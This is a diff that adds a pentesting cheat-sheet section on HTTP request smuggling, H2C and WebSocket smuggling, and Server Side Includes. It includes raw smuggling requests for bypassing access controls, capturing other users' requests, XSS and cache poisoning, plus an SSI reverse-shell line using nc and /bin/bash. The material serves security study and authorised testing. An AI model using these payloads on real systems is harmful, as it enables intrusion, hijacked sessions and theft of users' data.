@@ -533,6 +533,1011 @@ access your shell.php file and execute any command you wish:
 
 
 # <font color="red">HTTP SMUGGLING </font>
+## Theory :
+##### if a message is received with both a `Transfer-Encoding` header field and a Content-Length header field , the latter MUST be ignored
+#### **Content-Length**
+The Content-Length entity header indicates the size of the entity-body, in bytes, sent to the recipient.
+#### **Transfer-Encoding: chunked**
+The Transfer-Encoding header specifies the form of encoding used to safely transfer the payload body to the user. Chunked means that large data is sent in a series of chunks
+
+## Reality :
+The **Front-End** (a load-balance / Reverse Proxy) **process** the _**content-length**_ or the _**transfer-encoding**_ header and the **Back-end** server **process the other** one provoking a **desyncronization** between the 2 systems. This could be very critical as **an attacker will be able to send one request** to the reverse proxy that will be **interpreted** by the **back-end** server **as 2 different requests**. The **danger** of this technique resides in the fact the **back-end** server **will interpret** the **2nd request injected** as if it **came from the next client** and the **real request** of that client will be **part** of the **injected request**.
+
+## Particularities :
+Remember that in HTTP **a new line character is composed by 2 bytes:**
+
+- **Content-Length**: This header uses a **decimal number** to indicate the **number** of **bytes** of the **body** of the request. The body is expected to end in the last character, **a new line is not needed in the end of the request**.
+    
+- **Transfer-Encoding:** This header uses in the **body** an **hexadecimal number** to indicate the **number** of **bytes** of the **next chunk**. The **chunk** must **end** with a **new line** but this new line **isn't counted** by the length indicator. This transfer method must end with a **chunk of size 0 followed by 2 new lines**: `0`
+    
+- **Connection**: Based on my experience it's recommended to use `**Connection: keep-alive**` on the first request of the request Smuggling.
+
+note: When trying to exploit this with Burp Suite **disable** `**Update Content-Length**` **and** `**Normalize HTTP/1 line endings**` in the repeater because some gadgets abuse newlines, carriage returns and malformed content-lengths.
+
+HTTP request smuggling attacks are crafted by sending ambiguous requests that exploit discrepancies in how front-end and back-end servers interpret the `Content-Length` (CL) and `Transfer-Encoding` (TE) headers. These attacks can manifest in different forms, primarily as **CL.TE**, **TE.CL**, and **TE.TE**. Each type represents a unique combination of how the front-end and back-end servers prioritize these headers. The vulnerabilities arise from the servers processing the same request in different ways, leading to unexpected and potentially malicious outcomes.
+
+![](./statics/http-smuggling.png)
+
+#### CL.TE Vulnerability (Content-Length used by Front-End, Transfer-Encoding used by Back-End)
+
+- **Front-End (CL):** Processes the request based on the `Content-Length` header.
+    
+- **Back-End (TE):** Processes the request based on the `Transfer-Encoding` header.
+
+- **Attack Scenario:**
+    
+    - The attacker sends a request where the `Content-Length` header's value does not match the actual content length.
+        
+    - The front-end server forwards the entire request to the back-end, based on the `Content-Length` value.
+        
+    - The back-end server processes the request as chunked due to the `Transfer-Encoding: chunked` header, interpreting the remaining data as a separate, subsequent request.
+        
+    - **Example:**
+        
+        
+        
+        ```
+        POST / HTTP/1.1
+        Host: vulnerable-website.com
+        Content-Length: 30
+        Connection: keep-alive
+        Transfer-Encoding: chunked
+        
+        0
+        
+        GET /404 HTTP/1.1
+        Foo: x
+        ``` 
+
+
+#### TE.CL Vulnerability (Transfer-Encoding used by Front-End, Content-Length used by Back-End)
+
+- **Front-End (TE):** Processes the request based on the `Transfer-Encoding` header.
+    
+- **Back-End (CL):** Processes the request based on the `Content-Length` header.
+    
+- **Attack Scenario:**
+    
+    - The attacker sends a chunked request where the chunk size (`7b`) and actual content length (`Content-Length: 4`) do not align.
+        
+    - The front-end server, honoring `Transfer-Encoding`, forwards the entire request to the back-end.
+        
+    - The back-end server, respecting `Content-Length`, processes only the initial part of the request (`7b` bytes), leaving the rest as part of an unintended subsequent request.
+        
+    - **Example:**
+        
+        
+        
+        ```
+        POST / HTTP/1.1
+        Host: vulnerable-website.com
+        Content-Length: 4
+        Connection: keep-alive
+        Transfer-Encoding: chunked
+        
+        7b
+        GET /404 HTTP/1.1
+        Host: vulnerable-website.com
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 30
+        
+        x=
+        0
+        ```
+
+#### TE.TE Vulnerability (Transfer-Encoding used by both, with obfuscation)
+
+- **Servers:** Both support `Transfer-Encoding`, but one can be tricked into ignoring it via obfuscation.
+    
+- **Attack Scenario:**
+    
+    - The attacker sends a request with obfuscated `Transfer-Encoding` headers.
+        
+    - Depending on which server (front-end or back-end) fails to recognize the obfuscation, a CL.TE or TE.CL vulnerability may be exploited.
+        
+    - The unprocessed part of the request, as seen by one of the servers, becomes part of a subsequent request, leading to smuggling.
+        
+    - **Example:**
+        
+        Copy
+        
+        ```
+        POST / HTTP/1.1
+        Host: vulnerable-website.com
+        Transfer-Encoding: xchunked
+        Transfer-Encoding : chunked
+        Transfer-Encoding: chunked
+        Transfer-Encoding: x
+        Transfer-Encoding: chunked
+        Transfer-Encoding: x
+        Transfer-Encoding:[tab]chunked
+        [space]Transfer-Encoding: chunked
+        X: X[\n]Transfer-Encoding: chunked
+        
+        Transfer-Encoding
+        : chunked
+        ```
+
+#### **CL.CL Scenario (Content-Length used by both Front-End and Back-End):**
+
+- Both servers process the request based solely on the `Content-Length` header.
+    
+- This scenario typically does not lead to smuggling, as there's alignment in how both servers interpret the request length.
+    
+- Example:
+    
+    
+    
+    ```
+    POST / HTTP/1.1
+    Host: vulnerable-website.com
+    Content-Length: 16
+    Connection: keep-alive
+    
+    Normal Request
+    ```
+    
+#### **CL != 0 Scenario:**
+
+- Refers to scenarios where the `Content-Length` header is present and has a value other than zero, indicating that the request body has content.
+    
+- It's crucial in understanding and crafting smuggling attacks, as it influences how servers determine the end of a request.
+    
+- **Example:**
+    
+    Copy
+    
+    ```
+    POST / HTTP/1.1
+    Host: vulnerable-website.com
+    Content-Length: 16
+    Connection: keep-alive
+    
+    Non-Empty Body
+    ```
+
+
+#### Breaking the web server
+
+This technique is also useful in scenarios where it's possible to **break a web server while reading the initial HTTP data** but **without closing the connection**. This way, the **body** of the HTTP request will be considered the **next HTTP request**.
+
+For example, as explained in [**this writeup**](https://mizu.re/post/twisty-python), In Werkzeug it was possible to send some **Unicode** characters and it will make the server **break**. However, if the HTTP connection was created with the header `**Connection: keep-alive**`, the body of the request won’t be read and the connection will still be open, so the **body** of the request will be treated as the **next HTTP request**.
+
+#### Forcing via hop-by-hop headers
+
+Abusing hop-by-hop headers you could indicate the proxy to **delete the header Content-Length or Transfer-Encoding so a HTTP request smuggling is possible to abuse**.
+
+
+```
+Connection: Content-Length
+```
+
+
+## Finding HTTP Request Smuggling 
+
+### Finding CL.TE Vulnerabilities Using Timing Technique
+
+#### Method:
+- Send a request that, if the application is vulnerable, will cause the back-end server to wait for additional data.
+- **Example:**
+    
+    
+    ```
+    POST / HTTP/1.1
+    Host: vulnerable-website.com
+    Transfer-Encoding: chunked
+    Connection: keep-alive
+    Content-Length: 4
+    
+    1
+    A
+    0
+    ```
+
+- **Indicators:**
+    
+    - Timeouts or long delays in response.
+        
+    - Receiving a 400 Bad Request error from the back-end server, sometimes with detailed server information.
+
+### Finding TE.CL Vulnerabilities Using Timing Techniques
+
+- **Method:**
+    
+    - Send a request that, if the application is vulnerable, will cause the back-end server to wait for additional data.
+        
+    - **Example:**
+        
+        
+        
+        ```
+        POST / HTTP/1.1
+        Host: vulnerable-website.com
+        Transfer-Encoding: chunked
+        Connection: keep-alive
+        Content-Length: 6
+        
+        0
+        X
+        ```
+        
+- - **Observation:**
+        
+        - The front-end server processes the request based on `Transfer-Encoding` and forwards the entire message.
+            
+        - The back-end server, expecting a message based on `Content-Length`, waits for additional data that never arrives, causing a delay.
+            
+        
+    
+
+### Other Methods to find Vulnerabilities
+- Differential Response Analysis:
+	- Send slightly varied versions of a request and observe if the server responses differ in an unexpected way, indicating a parsing discrepancy.
+- Using Automated Tools:
+	- Tools like Burp Suite's 'HTTP Request Smuggler' extension can automatically test for these vulnerabilities by sending various forms of ambiguous requests and analyzing the responses.
+- Content-Length Variance Tests:
+	- Send requests with varying `Content-Length` values that are not aligned with the actual content length and observe how the server handles such mismatches. 
+- Transfer-Encoding Variance Tests:
+	- Send requests with obfuscated or malformed
+		`Transfer-Encoding` headers and monitor how differently the front-end and back-end servers respond to such manipulation .
+### HTTP Request Smuggling Vulnerability Testing
+
+After confirming the effectiveness of timing techniques, it's crucial to verify if client requests can be manipulated. A straightforward method is to attempt poisoning your requests, for instance, making a request to `/` yield a 404 response. The `CL.TE` and `TE.CL` examples previously discussed in [Basic Examples](https://book.hacktricks.xyz/pentesting-web/http-request-smuggling#basic-examples) demonstrate how to poison a client's request to elicit a 404 response, despite the client aiming to access a different resource.
+
+**Key Considerations**
+
+When testing for request smuggling vulnerabilities by interfering with other requests, bear in mind:
+
+- **Distinct Network Connections:** The "attack" and "normal" requests should be dispatched over separate network connections. Utilizing the same connection for both doesn't validate the vulnerability's presence.
+    
+- **Consistent URL and Parameters:** Aim to use identical URLs and parameter names for both requests. Modern applications often route requests to specific back-end servers based on URL and parameters. Matching these increases the likelihood that both requests are processed by the same server, a prerequisite for a successful attack.
+    
+- **Timing and Racing Conditions:** The "normal" request, meant to detect interference from the "attack" request, competes against other concurrent application requests. Therefore, send the "normal" request immediately following the "attack" request. Busy applications may necessitate multiple trials for conclusive vulnerability confirmation.
+    
+- **Load Balancing Challenges:** Front-end servers acting as load balancers may distribute requests across various back-end systems. If the "attack" and "normal" requests end up on different systems, the attack won't succeed. This load balancing aspect may require several attempts to confirm a vulnerability.
+    
+- **Unintended User Impact:** If your attack inadvertently impacts another user's request (not the "normal" request you sent for detection), this indicates your attack influenced another application user. Continuous testing could disrupt other users, mandating a cautious approach.
+
+## Abusing HTTP Request smuggling 
+
+### Circumventing Front-End Security via HTTP Request Smuggling
+
+Sometimes, front-end proxies enforce security measures, scrutinizing incoming requests. However, these measures can be circumvented by exploiting HTTP Request Smuggling, allowing unauthorized access to restricted endpoints. For instance, accessing `/admin` might be prohibited externally, with the front-end proxy actively blocking such attempts. Nonetheless, this proxy may neglect to inspect embedded requests within a smuggled HTTP request, leaving a loophole for bypassing these restrictions.
+
+Consider the following examples illustrating how HTTP Request Smuggling can be used to bypass front-end security controls, specifically targeting the `/admin` path which is typically guarded by the front-end proxy:
+
+**CL.TE Example**
+
+
+```
+POST / HTTP/1.1
+Host: [redacted].web-security-academy.net
+Cookie: session=[redacted]
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 67
+Transfer-Encoding: chunked
+
+0
+GET /admin HTTP/1.1
+Host: localhost
+Content-Length: 10
+
+x=
+```
+
+In the CL.TE attack, the `Content-Length` header is leveraged for the initial request, while the subsequent embedded request utilizes the `Transfer-Encoding: chunked` header. The front-end proxy processes the initial `POST` request but fails to inspect the embedded `GET /admin` request, allowing unauthorized access to the `/admin` path.
+
+**TE.CL Example**
+
+Copy
+
+```
+POST / HTTP/1.1
+Host: [redacted].web-security-academy.net
+Cookie: session=[redacted]
+Content-Type: application/x-www-form-urlencoded
+Connection: keep-alive
+Content-Length: 4
+Transfer-Encoding: chunked
+2b
+GET /admin HTTP/1.1
+Host: localhost
+a=x
+0
+```
+
+Conversely, in the TE.CL attack, the initial `POST` request uses `Transfer-Encoding: chunked`, and the subsequent embedded request is processed based on the `Content-Length` header. Similar to the CL.TE attack, the front-end proxy overlooks the smuggled `GET /admin` request, inadvertently granting access to the restricted `/admin` path.
+
+
+#### Revealing front-end request rewriting 
+
+Applications often employ a **front-end server** to modify incoming requests before passing them to the back-end server. A typical modification involves adding headers, such as `X-Forwarded-For: <IP of the client>`, to relay the client's IP to the back-end. Understanding these modifications can be crucial, as it might reveal ways to **bypass protections** or **uncover concealed information or endpoints**.
+
+To investigate how a proxy alters a request, locate a POST parameter that the back-end echoes in the response. Then, craft a request, using this parameter last, similar to the following:
+
+
+
+```
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 130
+Connection: keep-alive
+Transfer-Encoding: chunked
+
+0
+
+POST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 100
+
+search=
+```
+
+In this structure, subsequent request components are appended after `search=`, which is the parameter reflected in the response. This reflection will expose the headers of the subsequent request.
+
+It's important to align the `Content-Length` header of the nested request with the actual content length. Starting with a small value and incrementing gradually is advisable, as too low a value will truncate the reflected data, while too high a value can cause the request to error out.
+
+This technique is also applicable in the context of a TE.CL vulnerability, but the request should terminate with `search=\r\n0`. Regardless of the newline characters, the values will append to the search parameter.
+
+This method primarily serves to understand the request modifications made by the front-end proxy, essentially performing a self-directed investigation.
+
+#### Capturing other users' requests
+
+It's feasible to capture the requests of the next user by appending a specific request as the value of a parameter during a POST operation. Here's how this can be accomplished:
+
+By appending the following request as the value of a parameter, you can store the subsequent client's request:
+
+
+```
+POST / HTTP/1.1
+Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 319
+Connection: keep-alive
+Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
+Transfer-Encoding: chunked
+
+0
+
+POST /post/comment HTTP/1.1
+Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
+Content-Length: 659
+Content-Type: application/x-www-form-urlencoded
+Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
+
+csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
+```
+
+In this scenario, the **comment parameter** is intended to store the contents within a post's comment section on a publicly accessible page. Consequently, the subsequent request's contents will appear as a comment.
+
+However, this technique has limitations. Generally, it captures data only up to the parameter delimiter used in the smuggled request. For URL-encoded form submissions, this delimiter is the `&` character. This means the captured content from the victim user's request will stop at the first `&`, which may even be part of the query string.
+
+Additionally, it's worth noting that this approach is also viable with a TE.CL vulnerability. In such cases, the request should conclude with `search=\r\n0`. Regardless of newline characters, the values will be appended to the search parameter.
+
+#### Using HTTP request smuggling to exploit reflected XSS
+
+HTTP Request Smuggling can be leveraged to exploit web pages vulnerable to **Reflected XSS**, offering significant advantages:
+
+- Interaction with the target users is **not required**.
+    
+- Allows the exploitation of XSS in parts of the request that are **normally unattainable**, like HTTP request headers.
+    
+
+In scenarios where a website is susceptible to Reflected XSS through the User-Agent header, the following payload demonstrates how to exploit this vulnerability:
+
+
+```
+POST / HTTP/1.1
+Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
+Cookie: session=ac311fa41f0aa1e880b0594d008d009e
+Transfer-Encoding: chunked
+Connection: keep-alive
+Content-Length: 213
+Content-Type: application/x-www-form-urlencoded
+
+0
+
+GET /post?postId=2 HTTP/1.1
+Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
+User-Agent: "><script>alert(1)</script>
+Content-Length: 10
+Content-Type: application/x-www-form-urlencoded
+
+A=
+```
+
+This payload is structured to exploit the vulnerability by:
+
+1. Initiating a `POST` request, seemingly typical, with a `Transfer-Encoding: chunked` header to indicate the start of smuggling.
+    
+2. Following with a `0`, marking the end of the chunked message body.
+    
+3. Then, a smuggled `GET` request is introduced, where the `User-Agent` header is injected with a script, `<script>alert(1)</script>`, triggering the XSS when the server processes this subsequent request.
+    
+
+By manipulating the `User-Agent` through smuggling, the payload bypasses normal request constraints, thus exploiting the Reflected XSS vulnerability in a non-standard but effective manner.
+
+#### Exploiting On-site Redirects with HTTP Request Smuggling
+
+Applications often redirect from one URL to another by using the hostname from the `Host` header in the redirect URL. This is common with web servers like Apache and IIS. For instance, requesting a folder without a trailing slash results in a redirect to include the slash:
+
+
+```
+GET /home HTTP/1.1
+Host: normal-website.com
+```
+
+Results in:
+
+
+
+```
+HTTP/1.1 301 Moved Permanently
+Location: https://normal-website.com/home/
+```
+
+Though seemingly harmless, this behavior can be manipulated using HTTP request smuggling to redirect users to an external site. For example:
+
+
+```
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 54
+Connection: keep-alive
+Transfer-Encoding: chunked
+
+0
+
+GET /home HTTP/1.1
+Host: attacker-website.com
+Foo: X
+```
+
+This smuggled request could cause the next processed user request to be redirected to an attacker-controlled website:
+
+
+
+```
+GET /home HTTP/1.1
+Host: attacker-website.com
+Foo: XGET /scripts/include.js HTTP/1.1
+Host: vulnerable-website.com
+```
+
+Results in:
+
+
+
+```
+HTTP/1.1 301 Moved Permanently
+Location: https://attacker-website.com/home/
+```
+
+In this scenario, a user's request for a JavaScript file is hijacked. The attacker can potentially compromise the user by serving malicious JavaScript in response.
+
+#### Exploiting Web Cache Poisoning via HTTP Request Smuggling
+
+Web cache poisoning can be executed if any component of the **front-end infrastructure caches content**, typically to enhance performance. By manipulating the server's response, it's possible to **poison the cache**.
+
+Previously, we observed how server responses could be altered to return a 404 error (refer to [Basic Examples](https://book.hacktricks.xyz/pentesting-web/http-request-smuggling#basic-examples)). Similarly, it’s feasible to trick the server into delivering `/index.html` content in response to a request for `/static/include.js`. Consequently, the `/static/include.js` content gets replaced in the cache with that of `/index.html`, rendering `/static/include.js` inaccessible to users, potentially leading to a Denial of Service (DoS).
+
+This technique becomes particularly potent if an **Open Redirect vulnerability** is discovered or if there's an **on-site redirect to an open redirect**. Such vulnerabilities can be exploited to replace the cached content of `/static/include.js` with a script under the attacker's control, essentially enabling a widespread Cross-Site Scripting (XSS) attack against all clients requesting the updated `/static/include.js`.
+
+Below is an illustration of exploiting **cache poisoning combined with an on-site redirect to open redirect**. The objective is to alter the cache content of `/static/include.js` to serve JavaScript code controlled by the attacker:
+
+
+```
+POST / HTTP/1.1
+Host: vulnerable.net
+Content-Type: application/x-www-form-urlencoded
+Connection: keep-alive
+Content-Length: 124
+Transfer-Encoding: chunked
+
+0
+
+GET /post/next?postId=3 HTTP/1.1
+Host: attacker.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=1
+```
+
+Note the embedded request targeting `/post/next?postId=3`. This request will be redirected to `/post?postId=4`, utilizing the **Host header value** to determine the domain. By altering the **Host header**, the attacker can redirect the request to their domain (**on-site redirect to open redirect**).
+
+After successful **socket poisoning**, a **GET request** for `/static/include.js` should be initiated. This request will be contaminated by the prior **on-site redirect to open redirect** request and fetch the content of the script controlled by the attacker.
+
+Subsequently, any request for `/static/include.js` will serve the cached content of the attacker's script, effectively launching a broad XSS attack.
+
+
+#### Using HTTP request smuggling to perform web cache deception
+
+> **What is the difference between web cache poisoning and web cache deception?**
+> 
+> - In **web cache poisoning**, the attacker causes the application to store some malicious content in the cache, and this content is served from the cache to other application users.
+>     
+> - In **web cache deception**, the attacker causes the application to store some sensitive content belonging to another user in the cache, and the attacker then retrieves this content from the cache.
+>     
+
+The attacker crafts a smuggled request that fetches sensitive user-specific content. Consider the following example:
+
+
+```
+`POST / HTTP/1.1`\
+`Host: vulnerable-website.com`\
+`Connection: keep-alive`\
+`Content-Length: 43`\
+`Transfer-Encoding: chunked`\
+``\ `0`\``\
+`GET /private/messages HTTP/1.1`\
+`Foo: X`
+```
+
+If this smuggled request poisons a cache entry intended for static content (e.g., `/someimage.png`), the victim's sensitive data from `/private/messages` might be cached under the static content's cache entry. Consequently, the attacker could potentially retrieve these cached sensitive data.
+
+#### Abusing TRACE via HTTP Request Smuggling
+
+[**In this post**](https://portswigger.net/research/trace-desync-attack) is suggested that if the server has the method TRACE enabled it could be possible to abuse it with a HTTP Request Smuggling. This is because this method will reflect any header sent to the server as part of the body of the response. For example:
+
+
+
+```
+TRACE / HTTP/1.1
+Host: example.com
+XSS: <script>alert("TRACE")</script>
+```
+
+Will send a response such as:
+
+
+
+```
+HTTP/1.1 200 OK
+Content-Type: message/http
+Content-Length: 115
+
+TRACE / HTTP/1.1
+Host: vulnerable.com
+XSS: <script>alert("TRACE")</script>
+X-Forwarded-For: xxx.xxx.xxx.xxx
+```
+
+An example on how to abuse this behaviour would be to **smuggle first a HEAD request**. This request will be responded with only the **headers** of a GET request (`**Content-Type**` among them). And smuggle **immediately after the HEAD a TRACE request**, which will be **reflecting the sent dat**a. As the HEAD response will be containing a `Content-Length` header, the **response of the TRACE request will be treated as the body of the HEAD response, therefore reflecting arbitrary data** in the response. This response will be sent to the next request over the connection, so this could be **used in a cached JS file for example to inject arbitrary JS code**.
+#### Abusing TRACE via HTTP Response Splitting
+
+Continue following [**this post**](https://portswigger.net/research/trace-desync-attack) is suggested another way to abuse the TRACE method. As commented, smuggling a HEAD request and a TRACE request it's possible to **control some reflected data** in the response to the HEAD request. The length of the body of the HEAD request is basically indicated in the Content-Length header and is formed by the response to the TRACE request.
+
+Therefore, the new idea would be that, knowing this Content-Length and the data given in the TRACE response, it's possible to make the TRACE response contains a valid HTTP response after the last byte of the Content-Length, allowing an attacker to completely control the request to the next response (which could be used to perform a cache poisoning).
+
+Example:
+
+```
+GET / HTTP/1.1
+Host: example.com
+Content-Length: 360
+
+HEAD /smuggled HTTP/1.1
+Host: example.com
+
+POST /reflect HTTP/1.1
+Host: example.com
+
+SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok\r\n
+Content-Type: text/html\r\n
+Cache-Control: max-age=1000000\r\n
+Content-Length: 44\r\n
+\r\n
+<script>alert("response splitting")</script>
+```
+
+Will generate these responses (note how the HEAD response has a Content-Length making the TRACE response part of the HEAD body and once the HEAD Content-Length ends a valid HTTP response is smuggled):
+
+
+```
+HTTP/1.1 200 OK
+Content-Type: text/html
+Content-Length: 0
+
+HTTP/1.1 200 OK
+Content-Type: text/html
+Content-Length: 165
+
+HTTP/1.1 200 OK
+Content-Type: text/plain
+Content-Length: 243
+
+SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok
+Content-Type: text/html
+Cache-Control: max-age=1000000
+Content-Length: 50
+
+<script>alert(“arbitrary response”)</script>
+```
+
+  
+Have you found some HTTP Request Smuggling vulnerability and you don't know how to exploit it. Try these other method of exploitation:
+
+[HTTP Response Smuggling / Desync](https://book.hacktricks.xyz/pentesting-web/http-response-smuggling-desync)
+
+
+
+Other HTTP Request Smuggling Techniques
+
+- Browser HTTP Request Smuggling (Client Side)
+    
+
+[Browser HTTP Request Smuggling](https://book.hacktricks.xyz/pentesting-web/http-request-smuggling/browser-http-request-smuggling)
+
+- Request Smuggling in HTTP/2 Downgrades
+    
+
+[Request Smuggling in HTTP/2 Downgrades](https://book.hacktricks.xyz/pentesting-web/http-request-smuggling/request-smuggling-in-http-2-downgrades)
+
+## Tools
+
+- [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
+    
+- [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
+    
+- [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
+    
+- [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
+    
+- [https://github.com/Moopinger/smugglefuzz](https://github.com/Moopinger/smugglefuzz)
+    
+- [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): This tool is a grammar-based HTTP Fuzzer useful to find weird request smuggling discrepancies.
+
+
+
+# <font color="red">H2C smuggling</font>
+
+### H2C Smuggling
+
+HTTP2 Over Cleartext (H2C)
+
+H2C, or **http2 over cleartext**, deviates from the norm of transient HTTP connections by upgrading a standard HTTP **connection to a persistent one**. This upgraded connection utilizes the http2 binary protocol for ongoing communication, as opposed to the single-request nature of plaintext HTTP.
+
+  
+The crux of the smuggling issue arises with the usage of a **reverse proxy**. Ordinarily, the reverse proxy processes and forwards HTTP requests to the backend, returning the backend's response after that. However, when the `Connection: Upgrade` header is present in an HTTP request (commonly seen with websocket connections), the reverse **proxy maintains a persistent connection** between client and server, facilitating the continuous exchange required by certain protocols. For H2C connections, adherence to the RFC necessitates the presence of three specific headers:
+
+Copy
+
+```
+Upgrade: h2c
+HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
+Connection: Upgrade, HTTP2-Settings
+```
+
+The vulnerability arises when, after upgrading a connection, the reverse proxy ceases to manage individual requests, assuming its job of routing is complete post-connection establishment. Exploiting H2C Smuggling allows for circumvention of reverse proxy rules applied during request processing, such as path-based routing, authentication, and WAF processing, assuming an H2C connection is successfully initiated.
+
+
+
+Vulnerable Proxies
+
+The vulnerability is contingent on the reverse proxy's handling of `Upgrade` and sometimes `Connection` headers. The following proxies inherently forward these headers during proxy-pass, thereby inherently enabling H2C smuggling:
+
+- HAProxy
+    
+- Traefik
+    
+- Nuster
+    
+
+Conversely, these services do not inherently forward both headers during proxy-pass. However, they may be configured insecurely, allowing unfiltered forwarding of `Upgrade` and `Connection` headers:
+
+- AWS ALB/CLB
+    
+- NGINX
+    
+- Apache
+    
+- Squid
+    
+- Varnish
+    
+- Kong
+    
+- Envoy
+    
+- Apache Traffic Server
+    
+
+
+Exploitation
+
+It's crucial to note that not all servers inherently forward the headers required for a compliant H2C connection upgrade. As such, servers like AWS ALB/CLB, NGINX, and Apache Traffic Server, among others, naturally block H2C connections. Nonetheless, it's worth testing with the non-compliant `Connection: Upgrade` variant, which excludes the `HTTP2-Settings` value from the `Connection` header, as some backends may not conform to the standards.
+
+The tools [**h2csmuggler by BishopFox**](https://github.com/BishopFox/h2csmuggler) and [**h2csmuggler by assetnote**](https://github.com/assetnote/h2csmuggler) facilitate attempts to **circumvent proxy-imposed protections** by establishing an H2C connection, thereby enabling access to resources shielded by the proxy.
+
+
+## Websocket smuggling 
+
+### Scenario 1
+
+In this scenario, a backend that offers a public WebSocket API alongside an inaccessible internal REST API is targeted by a malicious client seeking access to the internal REST API. The attack unfolds in several steps:
+
+1. The client initiates by sending an Upgrade request to the reverse proxy with an incorrect `Sec-WebSocket-Version` protocol version in the header. The proxy, failing to validate the `Sec-WebSocket-Version` header, believes the Upgrade request to be valid and forwards it to the backend.
+    
+2. The backend responds with a status code `426`, indicating the incorrect protocol version in the `Sec-WebSocket-Version` header. The reverse proxy, overlooking the backend's response status, assumes readiness for WebSocket communication and relays the response to the client.
+    
+3. Consequently, the reverse proxy is misled into believing a WebSocket connection has been established between the client and backend, while in reality, the backend had rejected the Upgrade request. Despite this, the proxy maintains an open TCP or TLS connection between the client and backend, allowing the client unrestricted access to the private REST API through this connection.
+    
+
+Affected reverse proxies include Varnish, which declined to address the issue, and Envoy proxy version 1.8.0 or older, with later versions having altered the upgrade mechanism. Other proxies may also be susceptible.
+
+![](https://book.hacktricks.xyz/~gitbook/image?url=https%3A%2F%2Fgithub.com%2F0ang3el%2Fwebsocket-smuggle%2Fraw%2Fmaster%2Fimg%2F2-4.png&width=768&dpr=4&quality=100&sign=f1f723d7&sv=1)
+
+![](https://github.com/0ang3el/websocket-smuggle/raw/master/img/2-4.png)
+
+### Scenario 2
+
+This scenario involves a backend with both a public WebSocket API and a public REST API for health checking, along with an inaccessible internal REST API. The attack, more complex, involves the following steps:
+
+1. The client sends a POST request to trigger the health check API, including an additional HTTP header `Upgrade: websocket`. NGINX, serving as the reverse proxy, interprets this as a standard Upgrade request based solely on the `Upgrade` header, neglecting the request's other aspects, and forwards it to the backend.
+    
+2. The backend executes the health check API, reaching out to an external resource controlled by the attacker that returns a HTTP response with status code `101`. This response, once received by the backend and forwarded to NGINX, deceives the proxy into thinking a WebSocket connection has been established due to its validation of only the status code.
+    
+
+
+![](https://github.com/0ang3el/websocket-smuggle/raw/master/img/3-4.png)
+
+> **Warning:** This technique's complexity increases as it requires the ability to interact with an endpoint capable of returning a status code 101.
+
+Ultimately, NGINX is tricked into believing a WebSocket connection exists between the client and the backend. In reality, no such connection exists; the health check REST API was the target. Nevertheless, the reverse proxy maintains the connection open, enabling the client to access the private REST API through it.
+
+![](https://github.com/0ang3el/websocket-smuggle/raw/master/img/3-5.png)
+
+Most reverse proxies are vulnerable to this scenario, but exploitation is contingent upon the presence of an external SSRF vulnerability, typically regarded as a low-severity issue.
+
+
+
+
+
+
+
+# <font color="red">Server side Inclusion/ Edge side Inclusion</font>
+## SSI
+SSI (Server Side Includes) are directives that are **placed in HTML pages, and evaluated on the server** while the pages are being served. They let you **add dynamically generated content** to an existing HTML page, without having to serve the entire page via a CGI program, or other dynamic technology. For example, you might place a directive into an existing HTML page, such as:
+
+`<!--#echo var="DATE_LOCAL" -->`
+
+And, when the page is served, this fragment will be evaluated and replaced with its value:
+
+`Tuesday, 15-Jan-2013 19:28:54 EST`
+
+The decision of when to use SSI, and when to have your page entirely generated by some program, is usually a matter of how much of the page is static, and how much needs to be recalculated every time the page is served. SSI is a great way to add small pieces of information, such as the current time - shown above. But if a majority of your page is being generated at the time that it is served, you need to look for some other solution.
+
+You can infer the presence of SSI if the web application uses files with the extensions ** `.shtml`, `.shtm` or `.stm`**, but it's not only the case.
+
+A typical SSI expression has the following format:
+
+
+
+```
+<!--#directive param="value" -->
+```
+
+### Check
+
+
+```
+// Document name
+<!--#echo var="DOCUMENT_NAME" -->
+// Date
+<!--#echo var="DATE_LOCAL" -->
+
+// File inclusion
+<!--#include virtual="/index.html" -->
+// Including files (same directory)
+<!--#include file="file_to_include.html" -->
+// CGI Program results
+<!--#include virtual="/cgi-bin/counter.pl" -->
+// Including virtual files (same directory)
+<!--#include virtual="file_to_include.html" -->
+// Modification date of a file
+<!--#flastmod file="index.html" -->
+
+// Command exec
+<!--#exec cmd="dir" -->
+// Command exec
+<!--#exec cmd="ls" -->
+// Reverse shell
+<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->
+
+// Print all variables
